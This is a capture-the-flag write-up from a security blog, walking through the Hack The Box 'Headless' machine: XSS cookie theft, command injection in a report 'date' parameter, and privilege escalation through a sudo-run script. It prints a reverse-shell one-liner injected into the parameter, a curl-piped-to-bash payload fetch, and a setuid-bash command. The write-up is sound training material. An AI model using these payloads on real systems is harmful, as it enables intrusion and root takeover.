<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Headless</title>
<meta name=description content="Platform: Hack The Box Link: Headless Level: Easy OS: Linux Read this write up in french
Headless starts with a static website. Through enumeration, we identify …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/posts/htb-headless/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Headless"><meta property="og:description" content="Platform: Hack The Box Link: Headless Level: Easy OS: Linux Read this write up in french
Headless starts with a static website. Through enumeration, we identify …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Headless/Headless.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Headless/Headless.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Headless"><meta name=twitter:description content="Platform: Hack The Box Link: Headless Level: Easy OS: Linux Read this write up in french
Headless starts with a static website. Through enumeration, we identify …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-headless/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-headless/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Headless/Headless.png"><link rel=canonical href=https://scorpiosec.com/posts/htb-headless/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-headless/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Headless</h1><small role=doc-subtitle></small><p class=post-date>6 min read |
<span class=post-date>July 19, 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platform: Hack The Box</li><li>Link: <a href=https://app.hackthebox.com/machines/Headless>Headless</a></li><li>Level: Easy</li><li>OS: Linux</li></ul><hr><p><a href=https://scorpiosec.com/fr/posts/htb-headless/>Read this write up in french</a></p><p>Headless starts with a static website. Through enumeration, we identify a contact form vulnerable to Cross-Site Scripting (XSS), though basic payloads prove ineffective. By capturing the admin&rsquo;s cookie value, we gain access to the dashboard page and establish our foothold through command injection. For privilege escalation, we exploit a custom script to take control of the root account.</p><p>Target IP address - <code>10.10.11.8</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/Headless 10.10.11.8
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-04-04 13:01 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.8
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.067s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>998</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 <span style=color:#56b6c2>(</span>protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>5000/tcp open  upnp?
</span></span><span style=display:flex><span>| fingerprint-strings: 
</span></span><span style=display:flex><span>|   GetRequest: 
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#d19a66>200</span> OK
</span></span><span style=display:flex><span>|     Server: Werkzeug/2.2.2 Python/3.11.2
</span></span><span style=display:flex><span>|     Date: Thu, <span style=color:#d19a66>04</span> Apr <span style=color:#d19a66>2024</span> 18:01:48 GMT
</span></span><span style=display:flex><span>|     Content-Type: text/html; <span style=color:#e06c75>charset</span><span style=color:#56b6c2>=</span>utf-8
</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#d19a66>2799</span>
</span></span><span style=display:flex><span>|     Set-Cookie: <span style=color:#e06c75>is_admin</span><span style=color:#56b6c2>=</span>InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; <span style=color:#e06c75>Path</span><span style=color:#56b6c2>=</span>/
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     &lt;!DOCTYPE html&gt;
</span></span><span style=display:flex><span>|     &lt;html <span style=color:#e06c75>lang</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;head&gt;
</span></span><span style=display:flex><span>|     &lt;meta <span style=color:#e06c75>charset</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;UTF-8&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;meta <span style=color:#e06c75>name</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;viewport&#34;</span> <span style=color:#e06c75>content</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;Under Construction&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;style&gt;
</span></span><span style=display:flex><span>|     body <span style=color:#56b6c2>{</span>
</span></span><span style=display:flex><span>|     font-family: <span style=color:#98c379>&#39;Arial&#39;</span>, sans-serif;
</span></span><span style=display:flex><span>|     background-color: <span style=color:#7f848e>#f7f7f7;</span>
</span></span><span style=display:flex><span>|     margin: 0;
</span></span><span style=display:flex><span>|     padding: 0;
</span></span><span style=display:flex><span>|     display: flex;
</span></span><span style=display:flex><span>|     justify-content: center;
</span></span><span style=display:flex><span>|     align-items: center;
</span></span><span style=display:flex><span>|     height: 100vh;
</span></span><span style=display:flex><span>|     .container <span style=color:#56b6c2>{</span>
</span></span><span style=display:flex><span>|     text-align: center;
</span></span><span style=display:flex><span>|     background-color: <span style=color:#7f848e>#fff;</span>
</span></span><span style=display:flex><span>|     border-radius: 10px;
</span></span><span style=display:flex><span>|     box-shadow: 0px 0px 20px rgba<span style=color:#56b6c2>(</span>0, 0, 0, 0.2<span style=color:#56b6c2>)</span>;
</span></span><span style=display:flex><span>|   RTSPRequest: 
</span></span><span style=display:flex><span>|     &lt;!DOCTYPE HTML&gt;
</span></span><span style=display:flex><span>|     &lt;html <span style=color:#e06c75>lang</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;head&gt;
</span></span><span style=display:flex><span>|     &lt;meta <span style=color:#e06c75>charset</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;utf-8&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;Error response&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;/head&gt;
</span></span><span style=display:flex><span>|     &lt;body&gt;
</span></span><span style=display:flex><span>|     &lt;h1&gt;Error response&lt;/h1&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;Error code: 400&lt;/p&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;Message: Bad request version <span style=color:#56b6c2>(</span><span style=color:#98c379>&#39;RTSP/1.0&#39;</span><span style=color:#56b6c2>)</span>.&lt;/p&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;Error code explanation: <span style=color:#d19a66>400</span> - Bad request syntax or unsupported method.&lt;/p&gt;
</span></span><span style=display:flex><span>|     &lt;/body&gt;
</span></span><span style=display:flex><span>|_    &lt;/html&gt;
</span></span><span style=display:flex><span><span style=color:#d19a66>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style=display:flex><span>SF-Port5000-TCP:V<span style=color:#56b6c2>=</span>7.94SVN%I<span style=color:#56b6c2>=</span>7%D<span style=color:#56b6c2>=</span>4/4%Time<span style=color:#56b6c2>=</span>660EEB0C%P<span style=color:#56b6c2>=</span>x86_64-pc-linux-gnu%r<span style=color:#56b6c2>(</span>
</span></span><span style=display:flex><span>SF:GetRequest,BE1,<span style=color:#98c379>&#34;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:20Python/3\.11\.2\r\nDate:\x20Thu,\x2004\x20Apr\x202024\x2018:01:48\x20
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Zf
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:s;\x20Path=/\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:20lang=\&#34;en\&#34;&gt;\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&#34;UTF-8\&#34;&gt;\n\x
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:20\x20\x20\x20&lt;meta\x20name=\&#34;viewport\&#34;\x20content=\&#34;width=device-widt
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:h,\x20initial-scale=1\.0\&#34;&gt;\n\x20\x20\x20\x20&lt;title&gt;Under\x20Constructi
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:on&lt;/title&gt;\n\x20\x20\x20\x20&lt;style&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20bo
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:dy\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:20&#39;Arial&#39;,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20dis
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:play:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20a
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:lign-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x2
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x200
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20&#34;</span><span style=color:#56b6c2>)</span>%r<span style=color:#56b6c2>(</span>RTSPRequest,16C,<span style=color:#98c379>&#34;&lt;!DOCTYPE
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\x20HTML&gt;\n&lt;html\x20lang=\&#34;en\&#34;&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:x20\x20\x20\x20\x20&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;\n\x20\x20\x20\x20\x20\x2
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x2
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20respo
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:nse&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;\
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20versi
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:on\x20\(&#39;RTSP/1\.0&#39;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x2
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0unsupported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&#34;</span><span style=color:#56b6c2>)</span>;
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 99.23 seconds
</span></span></code></pre></div><h2 id=enumeration>Enumeration</h2><p>We find the port 22 running SSH and the port 5000 but the service running on it is not immediately recognized. A few other things can be noted:</p><ul><li>It appears to be a web server based on the response to the GetRequest probe.</li><li>The server software is identified as &ldquo;Werkzeug/2.2.2 Python/3.11.2&rdquo;, suggesting that it&rsquo;s running a Python web application using the <a href=https://werkzeug.palletsprojects.com/en/3.0.x/>Werkzeug</a> framework.</li></ul><p>Visiting <code>http://10.10.11.8:5000/</code> we find to web page.</p><p><img src=/images/HTB-Headless/website-build.png alt="Headless webiste"></p><p>Clicking on the only button present brings a contact form with the url <code>http://10.10.11.8:5000/support</code>.</p><p><img src=/images/HTB-Headless/contact-form.png alt="Contact Support form"></p><p>Directory enumeration reveals <code>/dashboard</code> but that page is inaccessible at the moment and subdomain enumeration fails.</p><p><img src=/images/HTB-Headless/directory-bruteforcing.png alt="Gobuster command results"></p><p><img src=/images/HTB-Headless/dashboard-page.png alt="Dashboard page inaccessible"></p><p>We turn our focus to the contact form and test it for XSS.</p><p><img src=/images/HTB-Headless/XSS-attempt.png alt="XSS attempt"></p><p>After the submission we get a message that a hacking attempt was detected. So we can assume that if our payload is able to bypass the detection mechanism we will be able to exploit the target in some way.</p><p><img src=/images/HTB-Headless/xss-detected.png alt="XSS detected"></p><p>After multiple payloads failing, I notice the name of the cookie <code>is_admin</code>, if we get the correct value for it we will probably be able to access <code>/dashboard</code>. The current value of the cookie returns <code>user</code> (it appears to be base64 encoded).</p><p>The payloads available at <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection>PayloadsAllTheThings</a> all failed (or maybe I just could not make them work). Researching for alternatives ways, we find this <a href=https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e>medium article</a> showcasing another way to steal the cookie.</p><blockquote><p>I tried the payload with the message parameter alone and it wasn&rsquo;t working but after adding it to <code>User-Agent</code> we are able to get the cookie value on our web server</p></blockquote><p><img src=/images/HTB-Headless/XSS-cookie-stealing-payload.png alt="Cookie stealing via XSS"></p><p>The cookie is base64 encoded</p><p><img src=/images/HTB-Headless/admin-cookie-value.png alt="Admin cookie value"></p><p><img src=/images/HTB-Headless/cookie-value-decoded.png alt="Admin cookie value decoded"></p><p>We go back to the <code>/dashboard</code> page and by using the new cookie value <code>ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</code> we get access to the Administrator Dashboard.</p><p><img src=/images/HTB-Headless/cookie-editor.png alt=Cookie-Editor></p><p><img src=/images/HTB-Headless/Admin-dashboard.png alt="Admin dashboard accessed"></p><h2 id=initial-foothold>Initial Foothold</h2><p>The only option available is to select a date and generate a report. After capturing the request, we see that the only new parameter is <code>date</code>. Let&rsquo;s test for command injection via this parameter.</p><p><img src=/images/HTB-Headless/report-request.png alt="Generate Report request"></p><p>We are indeed able to do some command injection via the parameter.</p><p><img src=/images/HTB-Headless/command-injection.png alt="Command Injection verified"></p><p>Trying to get a reverse shell directly via the date parameter does not work, even though the previous command got executed.</p><pre tabindex=0><code>date=2023-09-22;sh -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1
</code></pre><p>Since sending the reverse shell does not work we can try to execute it via curl by adding <code>bash</code> at the end of the command. We place the reverse shell in a file and we execute it on the target.</p><blockquote><p>Here is the reverse shell used: <code>sh -i >& /dev/tcp/IP_ADDRESS/PORT_NUMBER 0>&amp;1</code></p></blockquote><pre tabindex=0><code>curl http://IP:PORT/revshell.sh|bash
</code></pre><p><img src=/images/HTB-Headless/reverse-shell.png alt="Reverse shell"></p><p>After sending the request we get a shell on our listener as the user <code>dvir</code>.</p><p><img src=/images/HTB-Headless/foothold.png alt=Foothold></p><p>We upgrade our shell with the commands below.</p><pre tabindex=0><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
stty rows 38 columns 116 
</code></pre><p>In the home folder, we find the user flag.</p><p><img src=/images/HTB-Headless/user-flag.png alt="User flag"></p><h2 id=privilege-escalation>Privilege Escalation</h2><p>Running <code>sudo -l</code> we discover that this user can run <code>/usr/bin/syscheck</code>.</p><p><img src=/images/HTB-Headless/sudo-l.png alt="sudo -l command"></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#7f848e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#56b6c2>[</span> <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$EUID</span><span style=color:#98c379>&#34;</span> -ne <span style=color:#d19a66>0</span> <span style=color:#56b6c2>]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>  <span style=color:#e5c07b>exit</span> <span style=color:#d19a66>1</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>last_modified_time</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>/usr/bin/find /boot -name <span style=color:#98c379>&#39;vmlinuz*&#39;</span> -exec stat -c %Y <span style=color:#56b6c2>{}</span> + | /usr/bin/sort -n | /usr/bin/tail -n 1<span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>formatted_time</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>/usr/bin/date -d <span style=color:#98c379>&#34;@</span><span style=color:#e06c75>$last_modified_time</span><span style=color:#98c379>&#34;</span> +<span style=color:#98c379>&#34;%d/%m/%Y %H:%M&#34;</span><span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span>/usr/bin/echo <span style=color:#98c379>&#34;Last Kernel Modification Time: </span><span style=color:#e06c75>$formatted_time</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>disk_space</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>/usr/bin/df -h / | /usr/bin/awk <span style=color:#98c379>&#39;NR==2 {print $4}&#39;</span><span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span>/usr/bin/echo <span style=color:#98c379>&#34;Available disk space: </span><span style=color:#e06c75>$disk_space</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>load_average</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>/usr/bin/uptime | /usr/bin/awk -F<span style=color:#98c379>&#39;load average:&#39;</span> <span style=color:#98c379>&#39;{print $2}&#39;</span><span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span>/usr/bin/echo <span style=color:#98c379>&#34;System load average: </span><span style=color:#e06c75>$load_average</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> ! /usr/bin/pgrep -x <span style=color:#98c379>&#34;initdb.sh&#34;</span> &amp;&gt;/dev/null; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>  /usr/bin/echo <span style=color:#98c379>&#34;Database service is not running. Starting it...&#34;</span>
</span></span><span style=display:flex><span>  ./initdb.sh 2&gt;/dev/null
</span></span><span style=display:flex><span><span style=color:#c678dd>else</span>
</span></span><span style=display:flex><span>  /usr/bin/echo <span style=color:#98c379>&#34;Database service is running.&#34;</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>exit</span> <span style=color:#d19a66>0</span>
</span></span></code></pre></div><p>The script does a number of things such as checking for root privileges, checking available disk space etc. But our way to root privileges is via the <code>initdb.sh</code> file.</p><p>We look for the file with <code>find / -type f -name 'initdb.sh' 2>/dev/null</code> in order to modify it, but it is not on the system so we have to create it.</p><pre tabindex=0><code>echo &#34;chmod u+s /bin/bash&#34; &gt; initdb.sh
</code></pre><p>The command above creates the file <code>initdb.sh</code> containing the command <code>chmod u+s /bin/bash</code> which sets the setuid bit (<code>u+s</code>) on the <code>/bin/bash</code> executable.</p><p>The user <code>dvir</code> is allowed to run the command <code>/usr/bin/syscheck</code> with sudo privileges without providing a password.</p><hr><h3 id=quick-explanation>Quick Explanation</h3><p><code>initdb.sh</code> is part of the script executed by <code>/usr/bin/syscheck</code>, and <code>initdb.sh</code> contains the command <code>chmod u+s /bin/bash</code>, so <code>dvir</code> can effectively gain root privileges by executing <code>/usr/bin/syscheck</code>. Here&rsquo;s how:</p><ol><li><code>dvir</code> runs <code>/usr/bin/syscheck</code> with sudo privileges.</li><li>Within the script executed by <code>/usr/bin/syscheck</code>, <code>initdb.sh</code> is executed.</li><li><code>initdb.sh</code> sets the setuid bit on <code>/bin/bash</code>, making <code>/bin/bash</code> run with the permissions of its owner (root) when executed by any user.</li><li>After <code>initdb.sh</code> has been executed, any subsequent execution of <code>/bin/bash</code> by <code>dvir</code> will run with root privileges, thanks to the setuid bit that was set.</li></ol><hr><p>After running <code>sudo /usr/bin/syscheck</code> and <code>/bin/bash -p</code> we become root and the flag is found at <code>/root/root.txt</code>.</p><p><img src=/images/HTB-Headless/root-flag.png alt="root flag"></p><h2 id=closing-words>Closing Words</h2><p>This box was fairly easy but required a good understanding of Linux and Bash. You can learn about both on HackTheBox Academy with:</p><ul><li><a href=https://academy.hackthebox.com/module/details/18>Linux Fundamentals</a> and <a href=https://academy.hackthebox.com/module/details/51>Linux Privilege Escalation</a></li><li><a href=https://academy.hackthebox.com/module/details/21>Introduction to Bash Scripting</a></li></ul><p>I also recommend checking out multiple write ups to have different perspectives, my go-tos are <a href=https://0xdf.gitlab.io/2024/07/20/htb-headless.html#>0xdf</a> and <a href="https://www.youtube.com/watch?v=FDCpJbS1OuQ&amp;ab_channel=IppSec">IppSec</a>.</p></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-crafty/>&#8592;
Previous:
HTB: Crafty</a></p><p class=prev-post-date>June 12, 2024</p></div><div class=next-post><p><a href=/posts/htb-boardlight/>Next:
HTB: BoardLight
&#8594;</a></p><p class=next-post-date>September 27, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold>Initial Foothold</a></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#quick-explanation>Quick Explanation</a></li></ul></li><li><a href=#closing-words>Closing Words</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>